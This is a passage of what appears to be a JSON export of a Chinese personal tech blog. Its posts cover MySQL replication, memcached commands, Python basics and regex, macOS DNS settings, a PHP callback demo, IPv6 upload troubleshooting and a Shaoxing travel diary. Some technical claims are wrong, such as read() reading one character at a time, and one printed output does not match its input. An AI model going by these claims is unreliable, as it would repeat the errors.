负责从库去主库读取二进制日志，并写入到从库的中继日志 Slave_SQL_Running: Yes # 负责将中继日志准缓存 SQL 语句后执行 Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 845 Relay_Log_Space: 533 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0 Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 1 Master_UUID: 81f0bce8-a512-11e7-9f7f-fa163ef278ba Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: Executed_Gtid_Set: Auto_Position: 0 Replicate_Rewrite_DB: Channel_Name: Master_TLS_Version: 1 row in set (0.00 sec)验证1.在主服务器创建数据库 mysql&gt; create database wordpress; Query OK, 1 row affected (0.00 sec)2.然后写入数据 /**CREATE DATEBASE**/ CREATE DATABASE IF NOT EXISTS wordpress; USE wordpress; /**CREATE TABLE**/ CREATE TABLE IF NOT EXISTS user (id INT NOT NULL AUTO_INCREMENT, username VARCHAR(100) NOT NULL, age INT(1) NOT NULL, create_time timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (id) ) DEFAULT CHARSET=utf8; /**INSERT DB**/ INSERT INTO user (username,age) VALUES (&apos;张三&apos;,&apos;1&apos;); INSERT INTO user (username,age) VALUES (&apos;张四&apos;,&apos;1&apos;); INSERT INTO user (username,age) VALUES (&apos;张五&apos;,&apos;1&apos;); INSERT INTO user (username,age) VALUES (&apos;李三&apos;,&apos;0&apos;); /**FLUSH DATABASE**/FLUSH PRIVILEGES; 2.在从服务器查看 mysql&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | wordpress | +--------------------+ 5 rows in set (0.00 sec) mysql&gt; use wordpress; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql&gt; select * from user; +----+----------+-----+---------------------+ | id | username | age | create_time | +----+----------+-----+---------------------+ | 1 | 张三 | 1 | 2017-09-30 09:52:12 | | 2 | 张四 | 1 | 2017-09-30 09:52:12 | | 3 | 张五 | 1 | 2017-09-30 09:52:12 | | 4 | 李三 | 0 | 2017-09-30 09:52:14 | +----+----------+-----+---------------------+ 4 rows in set (0.00 sec)","categories":[],"tags":[]},{"title":"memcached的使用","slug":"memcached的使用","date":"2017-09-27T09:28:13.000Z","updated":"2021-02-26T06:05:29.278Z","comments":true,"path":"posts/56435.html","link":"","permalink":"https://awen.me/posts/56435.html","excerpt":"Memcached是一个自由开源的，高性能，分布式内存对象缓存系统。Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。本质上，它是一个简洁的key-value存储系统。","text":"Memcached是一个自由开源的，高性能，分布式内存对象缓存系统。Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。本质上，它是一个简洁的key-value存储系统。 安装yum install libevent libevent-deve yum -y install memcached启动启动分前台启动和后台启动 1.前台启动 [root@memcached ~]# /usr/bin/memcached -p 11211 -m 64m -vv can&apos;t run as root without the -u switch [root@memcached ~]# /usr/bin/memcached -p 11211 -m 64m -vv -u root slab class 1: chunk size 96 perslab 10922 slab class 2: chunk size 120 perslab 8738 slab class 3: chunk size 152 perslab 6898 slab class 4: chunk size 192 perslab 5461 slab class 5: chunk size 240 perslab 4369 slab class 6: chunk size 304 perslab 3449 slab class 7: chunk size 384 perslab 2730 …… &lt;30 new auto-negotiating client connection 30: Client using the ascii protocol2.后台启动 [root@memcached ~]# /usr/bin/memcached -d -m 64M -u root -l 10.173.32.83 -p 11211 -c 256 -P /tmp/memcached.pid 启动选项： -d是启动一个守护进程； -m是分配给Memcache使用的内存数量，单位是MB； -u是运行Memcache的用户； -l是监听的服务器IP地址，可以有多个地址； -p是设置Memcache监听的端口，，最好是1024以上的端口； -c是最大运行的并发连接数，默认是1024； -P是设置保存Memcache的pid文件。 连接➜ ~ telnet 10.173.32.83 11211 Trying 10.173.32.83... Connected to 10.173.32.83. Escape character is &apos;^]&apos;.Memcached 的存储命令Memcached set 命令Memcached set 命令用于将 value(数据值) 存储在指定的 key(键) 中。如果set的key已经存在，该命令可以更新该key所对应的原来的数据，也就是实现更新的作用。语法：set 命令的基本语法格式如下： set key flags exptime bytes [noreply] value 参数说明如下： key：键值 key-value 结构中的 key，用于查找缓存值。 flags：可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息 。 exptime：在缓存中保存键值对的时间长度（以秒为单位，0 表示永远） bytes：在缓存中存储的字节数 noreply（可选）： 该参数告知服务器不需要返回数据 value：存储的值（始终位于第二行）（可直接理解为key-value结构中的value） 例如 ➜ ~ telnet 10.173.32.83 11211 Trying 10.173.32.83... Connected to 10.173.32.83. Escape character is &apos;^]&apos;. set foo 0 900 9 # 存数据 memcached STORED get foo # 获取数据 VALUE foo 0 9 memcached END其中 key → foo flag → 0 exptime → 900 (以秒为单位) bytes → 9 (数据存储的字节数) value → memcached输出信息 输出信息说明： STORED：保存成功后输出。 ERROR：在保持失败后输出。 Memcached add 命令Memcached add 命令用于将 value(数据值) 存储在指定的 key(键) 中。如果 add 的 key 已经存在，则不会更新数据(过期的 key 会更新)，之前的值将仍然保持相同，并且您将获得响应 NOT_STORED。 语法：add 命令的基本语法格式如下： add key flags exptime bytes [noreply] value 例如 add foo 0 900 9 memcached STORED get foo VALUE foo 0 9 memcached END add foo 0 900 9 memcached NOT_STOREDMemcached replace 命令Memcached replace 命令用于替换已存在的 key(键) 的 value(数据值)。如果 key 不存在，则替换失败，并且您将获得响应 NOT_STORED。语法：replace 命令的基本语法格式如下： replace key flags exptime bytes [noreply] value例如： add mkey 0 900 10 data_value STORED get mkey VALUE mkey 0 10 data_value END replace mkey 0 900 16 some_other_value STORED get mkey VALUE mkey 0 16 some_other_value END输出信息说明： STORED：保存成功后输出。 NOT_STORED：执行替换失败后输出。 Memcached append 命令Memcached append 命令用于向已存在 key(键) 的 value(数据值) 后面追加数据 。语法：append 命令的基本语法格式如下： append key flags exptime bytes [noreply] value例如 set runoob 0 900 9 memcached STORED get runoob VALUE runoob 0 9 memcached END append runoob 0 900 5 redis STORED get runoob VALUE runoob 0 14 memcachedredis ENDMemcached prepend 命令Memcached prepend 命令用于向已存在 key(键) 的 value(数据值) 前面追加数据 。语法：prepend 命令的基本语法格式如下： prepend key flags exptime bytes [noreply] value例如 set runoob 0 900 9 memcached STORED get runoob VALUE runoob 0 9 memcached END prepend runoob 0 900 5 redis STORED get runoob VALUE runoob 0 14 redismemcached ENDSTORED","categories":[],"tags":[]},{"title":"python 操作文件","slug":"python-操作文件","date":"2017-09-19T08:52:19.000Z","updated":"2021-02-26T06:05:29.284Z","comments":true,"path":"posts/1186.html","link":"","permalink":"https://awen.me/posts/1186.html","excerpt":"常用操作1.常用操作 f = open(path,&apos;r&apos;) f.read() f.readline() f.write() f.close()","text":"常用操作1.常用操作 f = open(path,&apos;r&apos;) f.read() f.readline() f.write() f.close() 2.中文支持 import codecs f = codecs.open(filename,mode,encoding)3.文件操作 import os os.path.exists(filename) #判断文件是否存在 os.rename(old,new) #重命名写入和读取中文1.读取和写入文件 #-*-coding:utf-8-*- import codecs f = codecs.open(&apos;/Users/wenjun/Downloads/ceshi&apos;,&apos;w&apos;,&apos;utf-8&apos;) f.write(u&apos;测试测试测试&apos;) f.write(u&apos;测试测试测试1&apos;) f.write(u&apos;测试测试测试2&apos;) f.close() f = codecs.open(&apos;/Users/wenjun/Downloads/ceshi&apos;,&apos;r&apos;,&apos;utf-8&apos;) print f.readline() f.close() 如上图所示，文件都打印到一行去了，因为没有换行 此外，read 和 readline 的区别，read每次只读取一个字符，而readline是一次读取一行。 2.判断文件是否存在 import os print os.path.exists(&apos;/Users/wenjun/Downloads/ceshi&apos;)如果存在返回 true 否则返回 false 3.Shelve库 Shelve 可以读写字典 import shelve f = shelve.open(&apos;file&apos;) f[&apos;baidu&apos;] = &apos;www.baidu.com&apos; f[&apos;qq&apos;] = &apos;www.qq.com&apos; f[&apos;163&apos;] = &apos;www.163.com&apos; print f f.close g = shelve.open(&apos;file&apos;) print g 4.cPickle 用来读写对象 import cPickle f = open(&apos;file1&apos;,&apos;w&apos;) obj1 = 2015,&quot;upyun&quot;,[1,2,3,4],{&quot;pyhon&quot;:100,&quot;java&quot;:200} obj2 = [&apos;hehe&apos;,&apos;jjj&apos;,&apos;cccc&apos;] cPickle.dump(obj1,f) cPickle.dump(obj2,f) f.close() f = open(&apos;file1&apos;,&apos;r&apos;) obj1_r = cPickle.load(f) print obj1_r obj2_r = cPickle.load(f) print obj2_r f.close()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 列表和元组、字典","slug":"python-列表和元组","date":"2017-09-12T07:20:50.000Z","updated":"2021-02-26T06:05:29.282Z","comments":true,"path":"posts/54602.html","link":"","permalink":"https://awen.me/posts/54602.html","excerpt":"列表&gt;&gt;&gt; a = [1,2,3,4,5] &gt;&gt;&gt; a[0] #第一个元素 1 &gt;&gt;&gt; a[-1] #倒数第一个元素 5","text":"列表&gt;&gt;&gt; a = [1,2,3,4,5] &gt;&gt;&gt; a[0] #第一个元素 1 &gt;&gt;&gt; a[-1] #倒数第一个元素 5 &gt;&gt;&gt; a[0:4] # 从0到4下标所对应的元素 [1, 2, 3, 4] &gt;&gt;&gt; a[:-1] # 从0到倒数第一之前的元素 [1, 2, 3, 4] &gt;&gt;&gt; a[0:] # 从1到最后的元素 [1, 2, 3, 4, 5] &gt;&gt;&gt; a[0:5:2] # 从0到5 每2个元素为间隔 [1, 3, 5]1.拷贝 &gt;&gt;&gt; a_ref = a # 引用 a &gt;&gt;&gt; a[2] = 100 &gt;&gt;&gt; a [1, 2, 100, 4, 5] &gt;&gt;&gt; a_copy = a[:] # 拷贝 &gt;&gt;&gt; a [1, 2, 100, 4, 5]2.追加 &gt;&gt;&gt; a.append(300) &gt;&gt;&gt; a [1, 2, 100, 4, 5, 300]3.在下标1的位置插入50 &gt;&gt;&gt; a.insert(1,50) &gt;&gt;&gt; a [1, 50, 2, 100, 4, 5, 300]4.排序 &gt;&gt;&gt; a.sort() &gt;&gt;&gt; a [1, 2, 4, 5, 50, 100, 300]5.逆行排序 &gt;&gt;&gt; a.reverse() &gt;&gt;&gt; a [300, 100, 50, 5, 4, 2, 1]6.引用 上面我们定义了 a_ref,虽然我们一直是对 a 进行操作，但是发现到这里打印的值都是一样的，因为他们引用的都是同一个地址空间 &gt;&gt;&gt; a [300, 100, 50, 5, 4, 2, 1] &gt;&gt;&gt; a_ref [300, 100, 50, 5, 4, 2, 1] 但是我们输出 a 的 copy 还是最开始的，没有变的 &gt;&gt;&gt; a_cppy [1, 2, 100, 4, 5]7.查看地址 &gt;&gt;&gt; b = [a,a_ref,a_copy] &gt;&gt;&gt; b [[300, 100, 50, 5, 4, 2, 1], [300, 100, 50, 5, 4, 2, 1], [300, 100, 50, 5, 4, 2, 1]] &gt;&gt;&gt; id(a) 4328794880 &gt;&gt;&gt; id(a_ref) 4328794880 &gt;&gt;&gt; id(a_copy) 4328795168发现 a 和 a_ref的 id 都是一样的，而 copy 不一样。 8.加法 &gt;&gt;&gt; a+[100,200] [300, 100, 50, 5, 4, 2, 1, 100, 200] &gt;&gt;&gt;9.乘法 &gt;&gt;&gt; d=a*2 &gt;&gt;&gt; d [300, 100, 50, 5, 4, 2, 1, 300, 100, 50, 5, 4, 2, 1] &gt;&gt;&gt; a[0]=50 &gt;&gt;&gt; a [50, 100, 50, 5, 4, 2, 1] &gt;&gt;&gt; d [300, 100, 50, 5, 4, 2, 1, 300, 100, 50, 5, 4, 2, 1]发现乘以后 a 的值变了 而 d 的没变，d 不是引用 10.字符串、数字都是常量，一旦赋值不能改变 &gt;&gt;&gt; s = &apos;abc&apos; &gt;&gt;&gt; s[0] = &apos;c&apos; Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; TypeError: &apos;str&apos; object does not support item assignment &gt;&gt;&gt;元组元组用括号表示 &gt;&gt;&gt; a = (1,2,3) &gt;&gt;&gt; a (1, 2, 3)元组可以追加 &gt;&gt;&gt; a+(1,2) (1, 2, 3, 1, 2)元组一旦赋值不能更改 &gt;&gt;&gt; a[0]=50 Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; TypeError: &apos;tuple&apos; object does not support item assignment字典字典（dict）是一个关键词和值对应的数据结构 key-value &gt;&gt;&gt; d = {&quot;zhangsna&quot;:14,&quot;lici&quot;:20} &gt;&gt;&gt; d {&apos;lici&apos;: 20, &apos;zhangsna&apos;: 14}访问字典 &gt;&gt;&gt; a = {&quot;kuzan&quot;: {&quot;bucket&quot;: &quot;file201503&quot;,&quot;meta&quot;: {&quot;props&quot;: {&quot;domains&quot;: [&quot;file201503.b0.upaiyun.com&quot;]}} &gt;&gt;&gt; a[&apos;kuzan&apos;][&apos;bucket&apos;] &apos;file201503&apos; &gt;&gt;&gt; a[&apos;kuzan&apos;][&apos;meta&apos;][&apos;props&apos;][&apos;domains&apos;][0] &apos;file201503.com&apos;","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python 日期和时间","slug":"python-日期和时间","date":"2017-09-12T02:20:11.000Z","updated":"2021-02-26T06:05:29.285Z","comments":true,"path":"posts/28384.html","link":"","permalink":"https://awen.me/posts/28384.html","excerpt":"datetime","text":"datetime #-*-coding:utf-8-*- import datetime a = datetime.date.today() # 输出2017-09-12 b = datetime.datetime.now() # 2017-09-12 10:38:58.858195 需要加 utf-8支持 否则报错 d1 = datetime.timedelta(days=1000) # 间隔时间1000天 d2 = datetime.timedelta(hours=1000) # 间隔小时 a1 = (a-d1).isoformat() # 显示2014-12-17 a2 = (a+d1).strftime(&apos;/%m/%d/%Y&apos;) # 显示/06/08/2020 b.isoformat b2 = (b-d2) # 输出 2017-08-01 18:43:31.258676time#-coding:utf-8-*- import time a = input(&quot;please input 0 or 1:&quot;) start_time = time.time() # Windows 使用这个 start_clock = time.clock() # linux or mac 使用这个 if a: sum_i = 0 for i in range(1000): sum_i+=1 else: sum_i=sum(range(10000)) print sum_i time.sleep(2) end_time = time.time() end_clock = time.clock() print &quot;time-delta:&quot; print start_time-end_time print &quot;clock-delta:&quot; print start_clock-end_clock运行 ➜ Downloads python datedemo.py please input 0 or 1:0 49995000 time-delta: -2.00399494171 clock-delta: -0.000604 可以看到 虽然 time.time和 time.clock都可以表示程序的执行时间，但是 time.clock没有考虑 time.sleep()的时间；而 time.time则是考虑了 time.sleep()的时间。所以可以看出来用 time.clock更精确表示程序的执行时间。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"绍兴一日游","slug":"绍兴一日游","date":"2017-09-10T06:28:38.000Z","updated":"2021-02-26T06:05:29.350Z","comments":true,"path":"posts/53026.html","link":"","permalink":"https://awen.me/posts/53026.html","excerpt":"周末去了趟绍兴，从杭州东站乘高铁到达绍兴北站只需要20分钟的车程，车票19块5毛钱。达到绍兴后，第一站，去了鲁迅故里，从北站门口乘BRT1前往第二医院往回走500米就到了。映入眼帘的是一面硕大的墙，上面有鲁迅先生的像，旁边写着鲁迅故里。","text":"周末去了趟绍兴，从杭州东站乘高铁到达绍兴北站只需要20分钟的车程，车票19块5毛钱。达到绍兴后，第一站，去了鲁迅故里，从北站门口乘BRT1前往第二医院往回走500米就到了。映入眼帘的是一面硕大的墙，上面有鲁迅先生的像，旁边写着鲁迅故里。 往里走200米，最左侧的小河旁边就是三味书屋了，绍兴的的确确是一座四周环水的城市，素有“江南鱼米之乡”的美称。这里历史上有很多的名人，比如兰亭、大禹陵、鲁迅故里、沈园、柯岩、蔡元培故居、周恩来祖居、秋瑾故居、马寅初故居、王羲之故居、贺知章故居等。这些房子旁边的小河沟都是一些当地人划着乌篷船载着游客观光。 首先参观了三味书屋，然后出来到了百草园并参观了鲁迅故居，虽然小时候学的那篇《从百草园到三味书屋》我已经记得不太清楚了，小时候老师还要求我们背诵课文，不然不让吃饭： 我家的后面有一个很大的园，相传叫作百草园。现在是早已并屋子一起卖给朱 文公的子孙了，连那最末次的相见也已经隔了七八年，其中似乎确凿只有一些野草 ；但那时却是我的乐园。 不必说碧绿的菜畦，光滑的石井栏，高大的皂荚树，紫红的桑椹；也不必说鸣 蝉在树叶里长吟，肥胖的黄蜂伏在菜花上，轻捷的叫天子（云雀）忽然从草间直窜 向云霄里去了。单是周围的短短的泥墙根一带，就有无限趣味。油蛉在这里低唱， 蟋蟀们在这里弹琴。翻开断砖来，有时会遇见蜈蚣；还有斑蝥，倘若用手指按住它 的脊梁，便会拍的一声，从后窍喷出一阵烟雾。何首乌藤和木莲藤缠络着，木莲有 莲房一般的果实，何首乌有拥肿的根。有人说，何首乌根是有象人形的，吃了便可 以成仙，我于是常常拔它起来，牵连不断地拔起来，也曾因此弄坏了泥墙，却从来 没有见过有一块根象人样。如果不怕刺，还可以摘到覆盆子，象小珊瑚珠攒成的小 球，又酸又甜，色味都比桑椹要好得 ……不过从这里可以看到鲁迅上学离家是真近，并且鲁迅家房产可真大，祖父是清末大学士。鲁迅那么牛逼也就正常不过了。不过祖父官场作弊被抓，鲁迅父亲也是个秀才，但是屡试不第，鲁迅祖父周福清利用关系准备儿子考上去，结果事情败露被抓，儿子36岁就死了，家道中落，加上大清的国运已尽，所以其实也并不是特别好，但是好歹瘦死的骆驼比马大。鲁迅的家庭条件可比一般穷苦人家要好千倍了。 三味书屋是私塾，私塾还分家塾、族塾、私塾、村塾等等，我一直很想看看鲁迅刻的那个早字，但是工作人员说这里面都是文物，不能进。所以作罢，那可是小时候老师鼓励我们努力学习的一碗鸡汤啊！ 然后参观了鲁迅老家，往里走还去了百草园，不禁感叹，鲁迅家确实是大。百草园里现在是各种蔬菜。 鲁迅家的灶台都这么大，而且灶台还有很多画。 随后，正好赶上地方戏曲越剧的表演，不过我向来对这种传统戏曲无感。因为听不懂。 参观完鲁迅故居后，去了趟大禹陵，大禹陵在会稽山，这应该是我参观皇陵中历史最久远的中国古代一个真正意义上的朝代—夏朝开国君主–禹的陵。之前去过南京中山陵，夏禹陵园没有中山陵大，但里面有很多的碑文都是清朝时期的，比如康熙年代、雍正年代、乾隆年代留下的。从神道进去大概10分钟就到了，神道两边各种上古神兽守卫着陵园，依次是辟邪、天鹿、龙马、巨象、獬豸、卧牛、石虎、黄熊、三足鳖、九尾狐、野猪和应龙十二对石像牲。不过这都是近几十年才加的东西。 午门的屋顶各式各样的飞禽走兽确实很漂亮。 总的来说大禹陵只是名字响亮点，其实里面没什么可以玩的东西，门票还很贵。并且夏朝那个时期的资料、文物现在也少的很，基本都是明清时期留下的碑文啊之类的。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"mac 命令行修改 dns","slug":"mac-命令行修改-dns","date":"2017-09-10T06:25:27.000Z","updated":"2021-02-26T06:05:29.276Z","comments":true,"path":"posts/45756.html","link":"","permalink":"https://awen.me/posts/45756.html","excerpt":"查看接口networksetup -listallnetworkservices设置 dnsnetworksetup -setdnsservers Wi-Fi 127.0.0.1","text":"查看接口networksetup -listallnetworkservices设置 dnsnetworksetup -setdnsservers Wi-Fi 127.0.0.1 查看设置的 dnsnetworksetup -getdnsservers Wi-Fi清空缓存dscacheutil -flushcache","categories":[],"tags":[]},{"title":"回调demo","slug":"回调demo","date":"2017-09-08T03:55:52.000Z","updated":"2021-02-26T06:05:29.321Z","comments":true,"path":"posts/58135.html","link":"","permalink":"https://awen.me/posts/58135.html","excerpt":"接收回调，以 php 为例，可以用下面的 file_get_contents(&quot;php://input&quot;);","text":"接收回调，以 php 为例，可以用下面的 file_get_contents(&quot;php://input&quot;); demo 如下 &lt;?php $myfile = fopen(&quot;res.txt&quot;, &quot;w&quot;); $notify = file_get_contents(&quot;php://input&quot;); fwrite($myfile, $notify); fclose($myfile);","categories":[],"tags":[]},{"title":"ipv6上传文件出现连接超时","slug":"ipv6上传文件出现连接超时","date":"2017-09-08T03:23:48.000Z","updated":"2021-02-26T06:05:29.274Z","comments":true,"path":"posts/15223.html","link":"","permalink":"https://awen.me/posts/15223.html","excerpt":"近日有接到客户反馈上传出现超时问题，于是协助客户排查，首先确认了下路由和 ping 都没问题，说明网络应该是正常的，然后创建了一个1G 的大文件使用 curl 模拟上传","text":"近日有接到客户反馈上传出现超时问题，于是协助客户排查，首先确认了下路由和 ping 都没问题，说明网络应该是正常的，然后创建了一个1G 的大文件使用 curl 模拟上传 zencodex@localhost:~$ dd if=/dev/zero of=test bs=1M count=100 100+0 records in 100+0 records out 104857600 bytes (105 MB) copied, 0.0929132 s, 1.1 GB/s指定 ipv4地址上传完全没问题 zencodex@localhost:~$ curl -T test http://43.230.89.190/filesyncali/test -u awen:password -v -H&quot;Host:v0.api.upyun.com&quot; * Hostname was NOT found in DNS cache * Trying 43.230.89.190... * Connected to 43.230.89.190 (43.230.89.190) port 80 (#0) * Server auth using Basic with user &apos;awen&apos; &gt; PUT /filesyncali/test HTTP/1.1 &gt; Authorization: Basic YXpasswd== &gt; User-Agent: curl/7.35.0 &gt; Accept: */* &gt; Host:v0.api.upyun.com &gt; Content-Length: 104857600 &gt; Expect: 100-continue &gt; &lt; HTTP/1.1 100 Continue * We are completely uploaded and fine &lt; HTTP/1.1 200 OK * Server marco/1.7 is not blacklisted &lt; Server: marco/1.7 &lt; Content-Type: application/octet-stream &lt; Transfer-Encoding: chunked &lt; Connection: keep-alive &lt; X-Request-Id: 84634fc437e5558238f7e49aa736ba02 &lt; X-Request-Path: 403-zj-fud-205 &lt; ETag: &quot;2f282b84e7e608d5852449ed940bfc51&quot; &lt; Date: Fri, 08 Sep 2017 03:11:48 GMT &lt; Access-Control-Allow-Origin: * &lt; * Connection #0 to host 43.230.89.190 left intact然后默认上传就出现500错误 zencodex@localhost:~$ curl -T test http://v0.api.upyun.com/filesyncali/test -u awen:password -v * Hostname was NOT found in DNS cache * Trying 2405:fd80:110:0:d63d:7eff:fe73:c46... * Connected to v0.api.upyun.com (2405:fd80:110:0:d63d:7eff:fe73:c46) port 80 (#0) * Server auth using Basic with user &apos;awen&apos; &gt; PUT /filesyncali/test HTTP/1.1 &gt; Authorization: Basic YXpasswd== &gt; User-Agent: curl/7.35.0 &gt; Host: v0.api.upyun.com &gt; Accept: */* &gt; Content-Length: 104857600 &gt; Expect: 100-continue &gt; &lt; HTTP/1.1 100 Continue &lt; HTTP/1.1 500 Internal Server Error * Server marco/1.7 is not blacklisted &lt; Server: marco/1.7 &lt; Date: Fri, 08 Sep 2017 03:13:35 GMT &lt; Content-Type: text/html &lt; Content-Length: 190 &lt; Connection: close &lt; X-Request-Id: 938f4dba429d1b864a3df2e4f7d8963b &lt; * Send failure: Connection reset by peer * Closing connection 0 curl: (55) Send failure: Connection reset by peer使用 ifconfig 看了下客户这个主机有 ipv6地址。 然后问了下内部的开发说是没开启 ipv6的支持。 所以遇到类似问题，可以在网卡禁止 ipv6的地址就可以了，另外也反馈运维那边尽快支持就可以。","categories":[],"tags":[{"name":"ipv6","slug":"ipv6","permalink":"https://awen.me/tags/ipv6/"}]},{"title":"基础:Python 正则表达式","slug":"基础-Python-正则表达式","date":"2017-09-06T01:38:49.000Z","updated":"2021-02-26T06:05:29.322Z","comments":true,"path":"posts/13625.html","link":"","permalink":"https://awen.me/posts/13625.html","excerpt":"字符串–re 模块Regular expression re.match(p,text) #从头开始匹配 re.search(p,text）#只要满足都可以匹配","text":"字符串–re 模块Regular expression re.match(p,text) #从头开始匹配 re.search(p,text）#只要满足都可以匹配 比如 &gt;&gt;&gt; import re &gt;&gt;&gt; text = &apos;c++ python2 python3 java rerl ruby lua java script php4 php7 c&apos; &gt;&gt;&gt; re.match(r&apos;java&apos;,text) #从头找没有找到 返回 null &gt;&gt;&gt; re.search(r&apos;java&apos;,text) #找到了返回一个对象 &lt;_sre.SRE_Match object at 0x10280aed0&gt; &gt;&gt;&gt; &gt;&gt;&gt; m=re.search(r&apos;java&apos;,text) &gt;&gt;&gt; m.start() 20 &gt;&gt;&gt; m.end() 24 &gt;&gt;&gt; &gt;&gt;&gt; m.group() &apos;java&apos;上面两个都是只返回一个，如果要匹配 c++ 因为 +号是特殊字符，所以需要转义 &gt;&gt;&gt; re.match(r&apos;c++&apos;,text) Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; File &quot;/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/re.py&quot;, line 141, in match return _compile(pattern, flags).match(string) File &quot;/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/re.py&quot;, line 251, in _compile raise error, v # invalid expression sre_constants.error: multiple repeat &gt;&gt;&gt; re.match(r&apos;c\\+\\+&apos;,text) &lt;_sre.SRE_Match object at 0x10280aed0&gt; &gt;&gt;&gt;我们接下来继续看 re.findall(p,text) # 匹配所有 re.split(p,text)比如查询所有的 Python &gt;&gt;&gt; re.findall(r&apos;python&apos;,text) [&apos;python&apos;, &apos;python&apos;] &gt;&gt;&gt;split 是把查到的内容切分开，比如下面text包含了2个 java，那么 split 查找到 java 就会把左边的和右边的分开。 &gt;&gt;&gt; text = &apos;c++ python2 python3 java rerl ruby lua java script php4 php7 c&apos; &gt;&gt;&gt; re.split(r&apos;java&apos;,text) [&apos;c++ python2 python3 &apos;, &apos; rerl ruby lua &apos;, &apos; script php4 php7 c&apos;]sub 是替换吧 a 替换成 b &gt;&gt;&gt; re.sub(r&apos;java&apos;,r&apos;hello&apos;,text) &apos;c++ python2 python3 hello rerl ruby lua hello script php4 php7 c&apos;正则1、“.” 匹配一个字符 &gt;&gt;&gt; print re.findall(r&apos;^c..&apos;,text) [&apos;c++&apos;] &gt;&gt;&gt; print re.findall(r&apos;^c.&apos;,text) [&apos;c+&apos;] &gt;&gt;&gt; print re.findall(r&apos;^c&apos;,text) [&apos;c&apos;]2、”+” 和”[]” ,”[]”是或的意思，“+”是1到正无穷 &gt;&gt;&gt; print re.findall(r&apos;p+&apos;,text) [&apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;] &gt;&gt;&gt; print re.findall(r&apos;p[a-zA-Z]&apos;,text) [&apos;py&apos;, &apos;py&apos;, &apos;pt&apos;, &apos;ph&apos;, &apos;ph&apos;] &gt;&gt;&gt; print re.findall(r&apos;p[a-zA-Z]+&apos;,text) [&apos;python&apos;, &apos;python&apos;, &apos;pt&apos;, &apos;php&apos;, &apos;php&apos;]3、”*” 是0到正无穷 &gt;&gt;&gt; print re.findall(r&apos;p[a-zA-Z]*&apos;,text) [&apos;python&apos;, &apos;python&apos;, &apos;pt&apos;, &apos;php&apos;, &apos;php&apos;]4、”?” 是0到1个 &gt;&gt;&gt; print re.findall(r&apos;p[a-zA-Z]?&apos;,text) [&apos;py&apos;, &apos;py&apos;, &apos;pt&apos;, &apos;ph&apos;, &apos;p&apos;, &apos;ph&apos;, &apos;p&apos;] &gt;&gt;&gt;5、 “{}” 表示重复次数，比如下面表示匹配重复4个字母以上的 &gt;&gt;&gt; print re.findall(r&apos;p[a-zA-Z]{4,}&apos;,text) [&apos;python&apos;, &apos;python&apos;]6、非用”^”表示 &gt;&gt;&gt; print re.findall(r&apos;c[a-zA-Z]*&apos;,text) [&apos;c&apos;, &apos;cript&apos;, &apos;c&apos;] &gt;&gt;&gt; print re.findall(r&apos;c[^a-zA-Z]*&apos;,text) [&apos;c++ &apos;, &apos;c&apos;, &apos;c&apos;]7、或 &gt;&gt;&gt; print re.findall(r&apos;[pj][a-zA-Z]+&apos;,text) [&apos;python&apos;, &apos;python&apos;, &apos;java&apos;, &apos;java&apos;, &apos;pt&apos;, &apos;php&apos;, &apos;php&apos;] 上面的方式用“|”来写就是这样的 &gt;&gt;&gt; print re.findall(r&apos;p[a-zaA-Z]+|j[a-zA-Z]+&apos;,text) [&apos;python&apos;, &apos;python&apos;, &apos;java&apos;, &apos;java&apos;, &apos;pt&apos;, &apos;php&apos;, &apos;php&apos;] &gt;&gt;&gt;如果是指在 j 前面加，则效果如下，这并不是我们想要的结果 &gt;&gt;&gt; print re.findall(r&apos;p|j[a-zA-Z]+&apos;,text) [&apos;p&apos;, &apos;p&apos;, &apos;java&apos;, &apos;java&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;, &apos;p&apos;]8、匹配空格 p[^0-9]+ 会匹配非数字，但是空格也算进去了，所以如果要去掉空格 p[^0-9 ]+ 需要这样写 &gt;&gt;&gt; print re.findall(r&apos;p[^0-9]+|j[a-zA-Z]+&apos;,text) [&apos;python&apos;, &apos;python&apos;, &apos;java&apos;, &apos;java&apos;, &apos;pt php&apos;, &apos;php&apos;] &gt;&gt;&gt; print re.findall(r&apos;p[^0-9 ]+|j[a-zA-Z]+&apos;,text) 